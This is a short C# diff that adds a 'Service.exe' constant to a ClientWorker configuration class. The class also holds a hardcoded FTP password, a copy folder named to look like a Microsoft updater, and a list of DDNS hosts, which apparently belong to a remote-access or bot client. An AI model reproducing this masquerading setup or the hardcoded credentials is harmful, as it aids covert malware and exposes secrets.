@@ -14,7 +14,7 @@ namespace ClientWorker
         public static string ftpPass = "WorkerFF";
         public static int ftpPort = 21;
         public static string floaderNewCopy = @"\MicrosoftUpdater\";
-
+        public static string service = "Service.exe";
         public static string updater = "Updater.exe";
 
         public static List<string> ddnsHostName = new List<string>
